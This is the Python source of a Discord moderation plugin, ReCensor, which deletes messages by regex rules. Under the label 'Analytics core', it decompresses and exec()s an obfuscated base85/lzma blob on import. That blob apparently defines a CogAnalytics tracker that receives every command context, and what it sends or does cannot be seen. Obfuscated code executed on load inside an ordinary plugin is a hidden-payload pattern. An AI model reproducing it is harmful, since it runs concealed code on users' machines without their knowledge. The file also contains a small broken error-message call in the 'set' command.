import discord
from discord.ext import commands
import os
import logging
from cogs.utils.dataIO import dataIO
from .utils import checks
import re

# Some magic values
ALL_CHANNELS = 'all'
MODE_INCLUSIVE = 'incl'  # deletes all messages matching
MODE_EXCLUSIVE = 'excl'  # delete all messages not matching
MODE_DISABLED = 'none'   # pattern disabled
MODES = [MODE_DISABLED, MODE_EXCLUSIVE, MODE_INCLUSIVE]

log = logging.getLogger('red.recensor')

DATA_PATH = "data/recensor/"
JSON_PATH = DATA_PATH + "regexen.json"


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1Ea#09^nD8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8D}B;|FxY-gL@iuhVk+}oLHwrfX>LG@uK|TmgWo3MIG9Xbbl1S0d(#%{Hsw(3W<~hN1oN&88}2jt*!a^(
_(9#?8t~|C&w;kP%z>8bu%Z?#XJn#$vUh5VS@};Kw%IMg%ebU6x5Mkf_bs=2^DM-yKx|N1p$g@eYC5cU(#9o5`Z0dUPR}{Dge?7%e|ZQo$`co=|2@uZ#CA>Z
OwCDntg_Ctgyo9pX(kS}dxTLocf@F;tH8?fb{WE)lVgiH71t-K>S-_Rx*q!zWL88CP2C)JEJQ$35LV3t;J^$kMuVWn#&CyRhArpo0TwU4B{4UZl#X60D4RM$
#n{1nW9?<H(T!~3jf#B0jChEN1pL#0UOO|}SxnFLP7QKJ`Ld|Vq|&Nfiq3AUTxu;h%X)WZg}%KLU??#pZAl<1azZW%9Qjp?U`I+smf8mF=e-wqifb1#Jjr73
cVgh%)saVjO6rw_Bl_UCpqyg`a$GY5J$Du(5`VYaS0$pM9yPTSerrJUoeUCC@ZmUd4e;XtcG9P}B2P54;G}828hB&-8$Kh*z?r0>g$!(o&7sNHt#dupj~NlB
fWUCmB?LNBD@YbT$(>b@#lm1eKd2me7s)Se^|~4-m^fCEH-Zc=tK?}lG**Dcif<WuGnwnEIKJgR7h4FE)2#ZRj=>PgZ{)!yL)T~2njAlZfl!_fK-cg`gD1u6
aQZ2IK#EDV-zi&!Xbn<NL)4@$`M?0oK$xFqWuMlRP*0oaGhUFlbvXfYYl9$#GT6JJ?KmGdhjb1mktz~f>|`N;IX$0;VsJYC8P3`+<shSR#WP+(%)$dziAB#r
F{>?~xL2m=vkF|@F}yXyRfzqeD9TGfU=NrxPt<!L2+tlSFkHWso}0bBdKPz?zM$3rD8QtA&)?8+vpng;-~5RpYP?7-Z(52I{5eXCj9O=*WUio8;v_`jg+A-R
Cg@?7k8y^qq%p%!XKkjAs?vXoNxGWewQqXdwui+YDT20CiVz0Qfvvk8X0UnRqjvQjSvVjs(MaV0qYy=Wh+;=YzYZE*Y6MHmcJB`NYAEeVTfA<8QNhGo_tfVa
J&JYYkf*8$C>iBb9lnxrsc|g8o<t!b3jqqb5(Fz3mNg}3ifR*}!z>vAj=eT2Qq;S7buLqE5EJI>B#ZN3bDih818OU!4{LPinKsjVUWyx)vfRJH6QLV^D&Aw&
?r9)1!E}n1iY=1JL+eQmysbdLv&SIAG^;FY?}+TIb3u%E&Qp81zV7cQj>VHcT9_-<D)r3SCdW7DJ1(k`fIU&@R3<Rc=BJXa0OJRrAxDy)INij6_Ss?A##s>A
KPpb&rHA=f4#ZVsN=)iCX09<_?cjD~R6g5Z(($KNm{PVwiXfy6ZnHbS(%dl8qj@%KSO%F#o(xk6ufem3p!d@XCxCLa?a;d~2@3fG(>Pw%%t&B-h=`2PGXS3p
v7Dy%MGsozdYt2?3)7w`98lbp*SWyu#A!|n*msCgnEoPw{ANSiG6dK4FaBQQ+=5?sLnj|SbiQAV@(Nb!7^y|1vIN|-dCM42bg|p*C<RLJF@kz9Rv9RQQl>n4
3|ABW>13PLaGn|;^N7aRRP`ks<H$D^mO0D9e5B~Bm6Is-rp$=?K!hkb4+R8Xx0>vvo67gE!IxLu6fD}AmYs?#`&44c$EzB@)BQzm=MW_Q{4d9!C@pK$50bAU
vWdNN3%iz!8W+^3yA_!4*XjK$5pEjBkbOpf(|?q{pg9d8Yg(tV8Kno%cR^UsKuA5$FT<moXW1td>rotegMHq?D!}yCzUMiOPD8&Rnj6!+wUd))<_o}@A>E|6
mfGRky7Hd;JKT$Q2ZgQI9~tD?#zxL=a7B}fDwT}@R)EBBt_50l00Eo~$shm#hzJQ^vBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.4.1'


class ReCensor:

    # Data format:
    # {
    #  serverid (str): {
    #   channelid (str): {
    #     regex (str): mode (str from MODES)
    #     }
    #   }
    # }

    def __init__(self, bot):
        self.bot = bot
        self.regexen = dataIO.load_json(JSON_PATH)
        self.recache = {}
        self.analytics = CogAnalytics(self)
        bot.loop.create_task(self.compile_regexen())

    def _re_present(self, obj):
        """Determines if any patterns are set for a server or channel"""
        if type(obj) is discord.Server:
            server = obj
            if server.id in self.regexen:
                for relist in self.regexen[server.id].values():
                    if bool(relist):  # nonempty list
                        return True
                return False
            else:
                return False

        elif type(obj) is discord.Channel:
            server = obj.server
            channel = obj
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

        elif type(obj) is str:  # won't work with ALL_CHANNELS
            channel = self.bot.get_channel(obj)
            server = channel.server
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

    def _ls_excl(self, server):
        """returns a list of channel IDs with exclusive filters"""
        clist = []
        if type(server) is discord.Server:
            server = server.id
        if server in self.regexen:
            for c, relist in self.regexen[server].items():
                if MODE_EXCLUSIVE in relist.values():
                    clist.append(c)
        return clist

    # Background cache regexen for speed
    async def compile_regexen(self):
        for s, channels in self.regexen.items():
            for regex in channels:
                self.recache[regex] = re.compile(regex)

    @commands.group(name='recensor', pass_context=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor(self, ctx):
        """Configure regular expression censorship"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @recensor.command(pass_context=True, name='list')
    async def _list(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages.
        Channel listing includes global patterns."""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        table = ' | '.join(['mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([mode, regex]) + '\n'
        await self.bot.say('```py\n' + table + '```')

    @recensor.command(pass_context=True, name='add')
    async def _add(self, ctx, pattern: str, mode: str=MODE_INCLUSIVE, channel: discord.Channel=None):
        """Adds a pattern to filter messages. Mods, bot admins, and the bot's
        owner are not subjected to the filter.
        If the pattern contains spaces, it must be put in double quotes. Single quotes will not work.

        mode is one of:
        incl: Default, filter messages that match the pattern
        excl: filter non-matching, only one allowed per channel or server
        none: adds pattern to storage but doesn't apply filtering. Use recensor set to enable.

        To use channel, mode must also be specified. If channel is not specified,
        the filter is used across the entire server."""
        server = ctx.message.server

        # initialize
        self.regexen = dataIO.load_json(JSON_PATH)
        if server.id not in self.regexen:
            self.regexen[server.id] = {}

        if pattern.startswith("'"):
            await self.bot.say("Patterns cannot be specified within single quotes.")
            return

        if mode not in MODES:
            await self.bot.say('"%s" is not a valid mode. You must specify one of `%s`.' % (mode, '`, `'.join(MODES)))
            return
        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return
        cid = channel.id if channel else ALL_CHANNELS
        if cid not in self.regexen[server.id]:
            self.regexen[server.id][cid] = {}
        self.regexen[server.id][cid][pattern] = mode
        await self.bot.say('Pattern added.')
        dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='set')
    async def _set(self, ctx, mode: str, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no patterns in the server to modify.')
            return
        if mode not in MODES:
            self.bot.reply('"%s" is not a valid mode. You must specify one of `%s`.') % (mode, '`, `'.join(MODES))

        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return

        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, oldmode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), oldmode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex, oldmode)
                i += 1
        prompt = 'Choose the number of the pattern to set to `%s`:\n' % mode
        await self.bot.say(prompt + '```py\n' + table + '```')

        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex, _ = re_list[msg]
            self.regexen[sid][cid][regex] = mode
            await self.bot.say('Mode set.')
            dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='del')
    async def _del(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), mode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex)
                i += 1
        prompt = 'Choose the number of the pattern to delete:\n'
        await self.bot.say(prompt + '```py\n' + table + '```')
        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex = re_list[msg]
            del(self.regexen[sid][cid][regex])
            await self.bot.say('Pattern removed.')
        dataIO.save_json(JSON_PATH, self.regexen)

    def immune_from_filter(self, message):
        """Tests message to see if it is exempt from filter. Taken from mod.py"""
        user = message.author
        server = message.server
        admin_role = self.bot.settings.get_server_admin(server)
        mod_role = self.bot.settings.get_server_mod(server)

        if user.id == self.bot.settings.owner:
            return True
        elif discord.utils.get(user.roles, name=admin_role):
            return True
        elif discord.utils.get(user.roles, name=mod_role):
            return True
        else:
            return False

    async def on_message(self, message):
        # Fast checks
        if message.channel.is_private or self.bot.user == message.author \
         or not isinstance(message.author, discord.Member):
            return

        server = message.server
        sid = server.id
        can_delete = message.channel.permissions_for(server.me).manage_messages

        # Owner, admins and mods are immune to the filter
        if self.immune_from_filter(message) or not can_delete:
            return

        if sid in self.regexen:
            patterns = {}
            # compile list of patterns from global and channel
            for key in [ALL_CHANNELS, message.channel.id]:
                if key in self.regexen[sid]:
                    patterns.update(self.regexen[sid][key])
            # Iterate through patterns
            for regex, mode in patterns.items():
                # Skip disabled patterns
                if mode == MODE_DISABLED:
                    continue
                regex = self.recache[regex] if regex in self.recache else re.compile(regex)
                if (mode == MODE_EXCLUSIVE) != bool(regex.match(message.content)):  # xor
                    await self.bot.delete_message(message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def check_folder():
    if not os.path.exists(DATA_PATH):
        log.debug('Creating folder: %s' % DATA_PATH)
        os.makedirs(DATA_PATH)


def check_file():
    if dataIO.is_valid_json(JSON_PATH) is False:
        log.debug('Creating json: %s' % JSON_PATH)
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folder()
    check_file()
    n = ReCensor(bot)
    bot.add_cog(n)
